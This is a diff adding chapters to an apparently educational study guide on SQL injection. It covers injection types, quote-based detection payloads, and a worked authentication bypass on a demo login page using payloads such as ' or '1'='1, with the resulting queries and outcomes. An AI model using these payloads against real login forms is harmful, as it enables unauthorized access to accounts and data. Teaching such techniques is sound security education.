@@ -16,7 +16,13 @@
 - SQL Statements
 - Query Results
 - SQL Operators
-### 📋 Chapter 8: Command Reference
+### 🔍 Chapter 8: Detecting SQL Injection
+### 🔓 Chapter 9: Subverting Query Logic
+- Authentication Bypass
+- SQLi Discovery
+- OR Injection
+- Auth Bypass with OR Operator
+### 📋 Chapter 10: Command Reference
 
 ---
 
@@ -48,9 +54,17 @@ SQL injection is classified by **how the results of the injected query are retri
 | **Blind** | Time-based | Data is inferred from response delays (e.g. `SLEEP()`) when there is no visible difference. |
 | **Out-of-band (OOB)** | — | Data is exfiltrated through a different channel (e.g. DNS/HTTP) when there is no direct or timing feedback. |
 
-- **In-band:** Injection and results travel over the **same channel** — the fastest and most direct.
-- **Blind:** The response shows **no data**, so it must be extracted bit by bit through inferred behavior.
-- **Out-of-band:** Used when the server has no visible or timing-based response, forcing it to reach out over another protocol.
+**In-band** — In simple cases, the output of both the intended query and the injected one is printed directly on the front end, where we can read it. It has two types:
+
+- **Union-based:** Uses the `UNION` operator to direct the injected query's output to a specific location. We usually have to specify the exact column that can be read, so the result is printed there.
+- **Error-based:** Used when PHP or SQL errors are shown on the front end. We intentionally cause an SQL error that returns the output of our query inside the error message.
+
+**Blind** — In more complicated cases, the output is not printed, so we use SQL logic to retrieve it **character by character**. It has two types:
+
+- **Boolean-based:** Uses SQL conditional statements to control whether the page returns any output at all — the page reacts only if the condition evaluates to `true`.
+- **Time-based:** Uses SQL conditional statements that **delay** the page response (via the `SLEEP()` function) when the condition evaluates to `true`.
+
+**Out-of-band (OOB)** — In some cases we have no direct access to the output whatsoever, so we direct it to a remote location (e.g. a **DNS record**) and retrieve it from there.
 
 ```mermaid
 flowchart TD
@@ -73,6 +87,8 @@ flowchart TD
     style C2 fill:#3a5a3a,stroke:#90EE90,stroke-width:2px,color:#fff
     style D1 fill:#3a5a3a,stroke:#90EE90,stroke-width:2px,color:#fff
 ```
+
+> **NOTE:** This module focuses only on introducing SQL injection through **Union-based** SQL injection.
 
 </details>
 
@@ -1650,6 +1666,280 @@ SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
 ---
 
 <details>
+<summary><h2>🔍 Detecting SQL Injection</h2></summary>
+
+Before exploiting an injection, we first need to confirm the input is injectable.
+
+The first step is to test a simple **payload** appended after our input (for example, after a username) and observe whether it causes **errors** or **changes in the page's behavior**. Any such anomaly signals that the input may be injectable.
+
+The simplest test is a single quote (`'`), which attempts to break out of the query string. Common test payloads and their URL-encoded forms:
+
+| Payload | URL-encoded |
+|---|---|
+| `'` | `%27` |
+| `"` | `%22` |
+| `#` | `%23` |
+| `;` | `%3B` |
+| `)` | `%29` |
+
+> **NOTE:** In some cases the **URL-encoded** version of the payload is required — for example, when the payload is placed directly in the URL (an HTTP GET request), where `'` becomes `%27`.
+
+</details>
+
+---
+
+<details>
+<summary><h2>🔓 Subverting Query Logic</h2></summary>
+
+Before executing entire SQL queries, we can modify the **original** query by injecting the `OR` operator and using SQL comments to subvert its logic. A classic example is bypassing web authentication.
+
+> **NOTE:** The panels below reproduce the application's output — the blue line is the **executed query**, followed by the login result.
+
+<details>
+<summary><h3>Authentication Bypass</h3></summary>
+
+Consider an administrator login page. We can log in with the valid credentials `admin` / `p@ssw0rd`. The page also displays the SQL query it executes, so we can see how to subvert it:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
+```
+
+🟢 **Login successful as user: admin**
+
+</td></tr>
+</table>
+
+The page uses the `AND` operator to select records matching **both** the username and password. If the database returns a matching record, the condition evaluates to `true` and the login succeeds. With incorrect credentials, the `AND` result is `false`:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username='admin' AND password = 'admin';
+```
+
+🔴 **Login failed!**
+
+</td></tr>
+</table>
+
+Our goal: log in as `admin` **without** knowing the password.
+
+</details>
+
+<details>
+<summary><h3>SQLi Discovery</h3></summary>
+
+First we test whether the form is injectable using one of the discovery payloads (see [Detecting SQL Injection](#-chapter-8-detecting-sql-injection)). Injecting a single quote (`'`) as the username:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username=''' AND password = 'something';
+```
+
+⚠️ **Error:** You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near `'something'` at line 1
+
+</td></tr>
+</table>
+
+A SQL error was thrown instead of `Login failed`. Our injected quote produced an **odd number of quotes**, breaking the syntax. Two ways forward:
+
+- **Comment out** the rest of the query (covered in a later section).
+- Use an **even number of quotes** so the final query stays valid — the approach used next.
+
+</details>
+
+<details>
+<summary><h3>OR Injection</h3></summary>
+
+To bypass authentication, we need the query to **always return true**, regardless of the username/password. We can abuse the `OR` operator.
+
+Per MySQL operator precedence, `AND` is evaluated **before** `OR`. So if the whole query contains at least one `true` condition joined by `OR`, the entire query evaluates to `true` (`OR` returns true if any operand is true).
+
+A condition that is always true is `'1'='1'`. To keep an **even number of quotes**, we drop the last quote and use `'1'='1` — the original query's trailing quote takes its place. Injected as the username:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+admin' or '1'='1
+```
+
+</td></tr>
+</table>
+
+The resulting query becomes:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
+```
+
+</td></tr>
+</table>
+
+Evaluating by precedence — `AND` first, then `OR`:
+
+```mermaid
+flowchart TD
+    U["username = 'admin'<br/>✅ True"]
+    O["'1'='1'<br/>✅ True"]
+    P["password = 'something'<br/>❌ False"]
+    AND{"AND"}
+    ANDR["❌ False"]
+    OR{"OR"}
+    R(["✅ True — Login as admin"])
+
+    O --> AND
+    P --> AND
+    AND --> ANDR
+    U --> OR
+    ANDR --> OR
+    OR --> R
+
+    style U fill:#1a4731,stroke:#6fcf97,stroke-width:2px,color:#fff
+    style O fill:#1a4731,stroke:#6fcf97,stroke-width:2px,color:#fff
+    style P fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
+    style ANDR fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
+    style AND fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style OR fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style R fill:#2a6a4a,stroke:#32cd32,stroke-width:3px,color:#fff
+```
+
+- `'1'='1'` is **True**, `password='something'` is **False** → `True AND False` = **False**.
+- Then `username='admin'` (**True**) `OR` **False** = **True**.
+- The `'1'='1'` branch is irrelevant here; the query returns true because the username `admin` exists, bypassing authentication.
+
+> **NOTE:** This is one of many auth-bypass payloads. A comprehensive list is available in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), each working on certain query types.
+
+</details>
+
+<details>
+<summary><h3>Auth Bypass with OR Operator</h3></summary>
+
+Using `admin' or '1'='1` as the username logs us in as `admin`:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
+```
+
+🟢 **Login successful as user: admin**
+
+</td></tr>
+</table>
+
+But what if we **don't** know a valid username? Trying `notAdmin`:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something';
+```
+
+🔴 **Login failed!**
+
+</td></tr>
+</table>
+
+The login failed because `notAdmin` does not exist, so the overall query is false:
+
+```mermaid
+flowchart TD
+    U["username = 'notAdmin'<br/>❌ False"]
+    O["'1'='1'<br/>✅ True"]
+    P["password = 'something'<br/>❌ False"]
+    AND{"AND"}
+    ANDR["❌ False"]
+    OR{"OR"}
+    R(["❌ False — Login failed"])
+
+    O --> AND
+    P --> AND
+    AND --> ANDR
+    U --> OR
+    ANDR --> OR
+    OR --> R
+
+    style U fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
+    style O fill:#1a4731,stroke:#6fcf97,stroke-width:2px,color:#fff
+    style P fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
+    style ANDR fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
+    style AND fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style OR fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style R fill:#8b0000,stroke:#ff6b6b,stroke-width:3px,color:#fff
+```
+
+To force an overall true query, we inject an `OR` condition into the **password** field too (`something' or '1'='1`):
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something' or '1'='1';
+```
+
+🟢 **Login successful as user: admin**
+
+</td></tr>
+</table>
+
+Now the `WHERE` clause returns every row, and the user in the first row is logged in. Since both conditions return true, we don't even need a test username/password — we can inject `' or '1'='1` into **both** fields directly:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username='' or '1'='1' AND password = '' or '1'='1';
+```
+
+🟢 **Login successful as user: admin**
+
+</td></tr>
+</table>
+
+This works because the query evaluates to true irrespective of the username or password.
+
+</details>
+
+</details>
+
+---
+
+<details>
 <summary><h2>📋 Command Reference</h2></summary>
 
 Quick reference of the statements covered so far — this table will grow as more commands are added.
@@ -1679,6 +1969,7 @@ Quick reference of the statements covered so far — this table will grow as mor
 | `AND` / `&&` | Logical AND — true only if both conditions are true |
 | `OR` / `\|\|` | Logical OR — true if at least one condition is true |
 | `NOT` / `!` | Logical NOT — inverts a boolean value |
+| `' OR '1'='1` | Auth-bypass payload — forces the `WHERE` clause always true |
 | `SHOW GRANTS;` | View the current user's privileges |
 
 </details>
